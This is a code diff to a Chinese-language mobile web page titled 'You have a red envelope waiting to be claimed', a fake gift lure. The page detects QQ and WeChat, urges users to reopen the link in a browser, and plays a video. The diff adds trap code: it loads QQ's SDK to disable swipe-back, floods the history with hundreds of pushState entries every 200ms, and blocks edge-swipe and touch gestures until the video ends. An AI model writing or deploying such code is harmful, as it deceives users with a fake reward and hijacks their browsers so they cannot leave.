@@ -2,10 +2,11 @@
 <html lang="zh">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <title>你有一个红包待领取</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
+html,body{overscroll-behavior-x:none;touch-action:pan-y;-webkit-overflow-scrolling:touch}
 body{background:#fff;min-height:100vh;font-family:-apple-system,"PingFang SC",sans-serif;overflow:hidden}
 #guide{display:none;align-items:center;justify-content:center;min-height:100vh;background:#fff;padding:20px}
 #guide .card{text-align:center;max-width:360px}
@@ -43,8 +44,7 @@ body{background:#fff;min-height:100vh;font-family:-apple-system,"PingFang SC",sa
 <div>2. 打开 <span>Chrome / Safari</span> 等浏览器</div>
 <div>3. 粘贴链接并访问</div>
 </div>
-<button class="btn" id="openBtn">一键打开浏览器</button>
-<button class="btn" id="copyBtn" style="background:#666;margin-top:10px">复制链接</button>
+<button class="btn" id="copyBtn">复制链接</button>
 <div class="hint" id="hint"></div>
 </div>
 </div>
@@ -66,7 +66,7 @@ body{background:#fff;min-height:100vh;font-family:-apple-system,"PingFang SC",sa
 <script>
 (function(){
 var ua=navigator.userAgent.toLowerCase();
-var isQQ=/qq\//.test(ua)||/qzone/.test(ua)||/mqqbrowser/.test(ua);
+var isQQ=/qq\//.test(ua)||/qzone/.test(ua);
 var isWeChat=/micromessenger/.test(ua);
 var isApp=isQQ||isWeChat;
 var url=location.href.split('#')[0].split('?')[0];
@@ -74,7 +74,6 @@ var url=location.href.split('#')[0].split('?')[0];
 var guide=document.getElementById("guide");
 var bait=document.getElementById("bait");
 var shield=document.getElementById("shield");
-var openBtn=document.getElementById("openBtn");
 var copyBtn=document.getElementById("copyBtn");
 var hint=document.getElementById("hint");
 var v=document.getElementById("v");
@@ -83,32 +82,54 @@ var pg=document.getElementById("pg");
 var started=false;
 var ended=false;
 
+// === 禁用右滑返回 ===
+function disableSwipeBack(){
+  // QQ 原生 API
+  if(isQQ){
+    var s=document.createElement("script");
+    s.src="https://open.mobile.qq.com/sdk/qqapi.js";
+    s.onload=function(){
+      try{
+        if(window.mqq&&mqq.invoke){
+          mqq.invoke("view","setSwipeBackEnabled",{enabled:false});
+          mqq.invoke("nav","setSwipeBackEnabled",{enabled:false});
+        }
+      }catch(e){}
+    };
+    document.head.appendChild(s);
+  }
+  // 微信+所有浏览器：历史+触摸拦截
+  try{for(var i=0;i<200;i++)history.pushState({},"",url);}catch(e){}
+
+  // 左边缘触摸拦截（防右滑返回手势）
+  var startX=0;
+  document.addEventListener("touchstart",function(e){
+    startX=e.touches[0].clientX;
+  },{passive:false});
+  document.addEventListener("touchmove",function(e){
+    var moveX=e.touches[0].clientX;
+    // 从左边缘开始右滑→拦截
+    if(startX<30&&moveX>startX+5){
+      e.preventDefault();
+      e.stopPropagation();
+    }
+  },{passive:false});
+}
+disableSwipeBack();
+
+// 引导页/诱饵页切换
 if(isApp){
   guide.style.display="flex";
   bait.style.display="none";
-  // 防返回：引导页也要拦
-  try{for(var i=0;i<200;i++)history.pushState({},"",url);}catch(e){}
-  window.onpopstate=function(){
-    try{for(var i=0;i<200;i++)history.pushState({},"",url);}catch(e){}
-  };
-  window.addEventListener("beforeunload",function(e){e.preventDefault();e.returnValue=""});
 }else{
   guide.style.display="none";
   bait.style.display="flex";
-  try{for(var i=0;i<200;i++)history.pushState({},"",url);}catch(e){}
 }
 
-// 一键打开浏览器（window.open 弹出新窗口，无前页历史）
-openBtn.addEventListener("click",function(){
-  var w=window.open(url+"?r="+Date.now(),"_blank");
-  if(w){
-    hint.textContent="已在浏览器中打开，请切换窗口查看";
-    hint.style.color="#4caf50";
-  }else{
-    hint.textContent="弹窗被拦截，请手动复制链接";
-    hint.style.color="#f444";
-  }
-});
+// popstate 拦截
+window.onpopstate=function(){
+  try{for(var i=0;i<200;i++)history.pushState({},"",url);}catch(e){}
+};
 
 // 复制链接
 copyBtn.addEventListener("click",function(){
@@ -156,6 +177,11 @@ function go(e){
     if(v.duration)pg.style.width=(v.currentTime/v.duration*100)+"%";
   };
 
+  // 播放时再次尝试禁用右滑
+  if(isQQ&&window.mqq&&mqq.invoke){
+    try{mqq.invoke("view","setSwipeBackEnabled",{enabled:false});}catch(ex){}
+  }
+
   // === 防退出 ===
   window.onpopstate=function(){
     if(!ended){
@@ -165,7 +191,6 @@ function go(e){
     }
   };
 
-  // 每200ms补历史
   setInterval(function(){
     if(!ended)try{for(var i=0;i<100;i++)history.pushState({},"",url);}catch(e){}
   },200);
@@ -182,7 +207,7 @@ function go(e){
   },{passive:false});
   shield.addEventListener("touchend",function(e){if(!ended)e.preventDefault();},{passive:false});
 
-  // 全局备用拦截
+  // 全局触摸拦截
   document.addEventListener("touchmove",function(e){
     if(!ended)e.preventDefault();
   },{passive:false});
@@ -212,6 +237,10 @@ function go(e){
   v.onended=function(){
     ended=true;
     shield.style.display="none";
+    // 恢复右滑返回
+    if(isQQ&&window.mqq&&mqq.invoke){
+      try{mqq.invoke("view","setSwipeBackEnabled",{enabled:true});}catch(ex){}
+    }
     document.exitFullscreen&&document.exitFullscreen();
     player.style.display="none";
     document.body.style.background="#1a1a2e";
